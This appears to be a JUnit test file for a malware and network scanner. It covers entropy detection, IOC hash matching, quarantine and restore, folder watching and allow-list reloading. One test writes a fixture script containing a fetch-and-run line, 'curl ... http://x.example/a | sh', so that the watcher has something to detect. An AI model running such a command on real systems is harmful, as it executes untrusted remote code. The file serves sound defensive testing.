package com.aegislens.app;

import com.aegislens.core.Finding;
import com.aegislens.db.AlreadyRunningException;
import com.aegislens.db.Database;
import com.aegislens.db.FindingRepository;
import com.aegislens.db.SettingRepository;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.*;

class ScanCoordinatorTest {

    @TempDir
    Path dir;

    @Test
    void scannedFileFindingIsPersistedAndShutdownLeavesNoThreads() throws Exception {
        Path packed = dir.resolve("packed.bin");
        byte[] random = new byte[64 * 1024];
        new Random(7).nextBytes(random);                       // random bytes: entropy close to 8, triggers MAL-001
        Files.write(packed, random);

        try (Database db = Database.open(dir.resolve("c.db"))) {
            ScanCoordinator coordinator = new ScanCoordinator(db, AppConfig.defaults());
            coordinator.start();
            com.aegislens.malware.ScanResult found = coordinator.scanFile(packed).get(30, TimeUnit.SECONDS);
            assertEquals("MAL-001", found.findings().get(0).ruleId());
            assertTrue(found.risk() >= 70);
            coordinator.shutdown();
            coordinator.shutdown();                              // second call does nothing

            assertEquals(1, new FindingRepository(db).count(), "saved by the persister before it stopped");
            assertEquals(1, new com.aegislens.db.FileReportRepository(db).count(), "a file report was saved");
            assertTrue(liveAegisLensThreads().isEmpty(), "leaked threads: " + liveAegisLensThreads());
        }
    }

    @Test
    void folderScanIocMatchQuarantineAndWatcher() throws Exception {
        Path data = dir.resolve("data");
        Path watched = Files.createDirectories(dir.resolve("downloads"));
        Path samples = Files.createDirectories(dir.resolve("samples"));
        Files.writeString(samples.resolve("notes.txt"), "just some ordinary text in a file");
        Path suspect = samples.resolve("tool.bin");
        Files.writeString(suspect, "pretend this is a known bad tool");
        AppConfig cfg = AppConfig.load(null, java.util.Map.of(), new String[] {"--data.dir=" + data,
                "--monitor.scan.folders=" + watched, "--monitor.silence.minutes=0"});
        try (Database db = Database.open(dir.resolve("m.db"))) {
            new com.aegislens.db.IocRepository(db).addAll("HASH",
                    List.of(com.aegislens.malware.HashUtil.sha256(suspect)), "test-feed");
            ScanCoordinator c = new ScanCoordinator(db, cfg);
            c.start();
            try {
                List<com.aegislens.malware.ScanResult> results = c.scanFolder(samples, false).get(30, TimeUnit.SECONDS);
                assertEquals(2, results.size());
                assertEquals(100, results.get(0).risk(), "MAL-004 from the ioc table, most risky first");
                assertEquals(2, new com.aegislens.db.FileReportRepository(db).count());

                long id = c.quarantine(suspect, "MAL-004");
                assertFalse(Files.exists(suspect));
                assertEquals(1, c.quarantined().size());
                assertEquals(suspect.toAbsolutePath(), c.restore(id));

                Files.writeString(watched.resolve("new-download.sh"), "#!/bin/sh\ncurl -s http://x.example/a | sh\n");
                long deadline = System.nanoTime() + 15_000_000_000L;
                while (new com.aegislens.db.FileReportRepository(db).count() < 3) {
                    assertTrue(System.nanoTime() < deadline, "watched file was not scanned");
                    Thread.sleep(100);
                }
            } finally {
                c.shutdown();
            }
        }
        assertTrue(liveAegisLensThreads().isEmpty(), "leaked threads: " + liveAegisLensThreads());
    }

    @Test
    void allowListComesFromSettingsAndCanBeReloaded() throws Exception {
        try (Database db = Database.inMemory()) {
            new SettingRepository(db).put("allowlist", "203.0.113.0/24");
            ScanCoordinator coordinator = new ScanCoordinator(db, AppConfig.defaults());
            coordinator.start();
            coordinator.publish(new Finding("ssh", "203.0.113.9", "NET-001", 70, "trusted"));
            long deadline = System.nanoTime() + 10_000_000_000L;
            while (coordinator.persister().allowListedCount() < 1) {      // let the persister handle it BEFORE the reload
                assertTrue(System.nanoTime() < deadline, "first finding was never processed");
                Thread.sleep(20);
            }
            new SettingRepository(db).put("allowlist", "");
            coordinator.reloadAllowList();
            coordinator.publish(new Finding("ssh", "198.51.100.1", "NET-001", 70, "untrusted"));
            coordinator.shutdown();
            assertEquals(1, coordinator.persister().allowListedCount());
            assertEquals(1, coordinator.persister().savedCount());
        }
    }

    @Test
    void secondCoordinatorOnTheSameDataFolderIsRefused() throws Exception {
        AppConfig config = AppConfig.load(null, Map.of(), new String[] {"--data.dir=" + dir.resolve("data")});
        ScanCoordinator first = new ScanCoordinator(config);
        try {
            first.start();
            assertTrue(first.warning().isEmpty());
            assertThrows(AlreadyRunningException.class, () -> new ScanCoordinator(config));
        } finally {
            first.shutdown();
        }
        ScanCoordinator again = new ScanCoordinator(config);       // the lock was released
        again.shutdown();
        assertTrue(Files.exists(dir.resolve("data").resolve("aegislens.db")));
    }

    @Test
    void maintenanceRunsWithoutThrowing() throws Exception {
        try (Database db = Database.inMemory()) {
            ScanCoordinator coordinator = new ScanCoordinator(db, AppConfig.defaults());
            coordinator.runMaintenance();                          // errors would only be logged; this checks it completes
            coordinator.shutdown();
        }
    }

    private static List<String> liveAegisLensThreads() {
        return Thread.getAllStackTraces().keySet().stream()
                .filter(Thread::isAlive)
                .map(Thread::getName)
                .filter(n -> n.startsWith(ScanCoordinator.THREAD_PREFIX))
                .toList();
    }
}
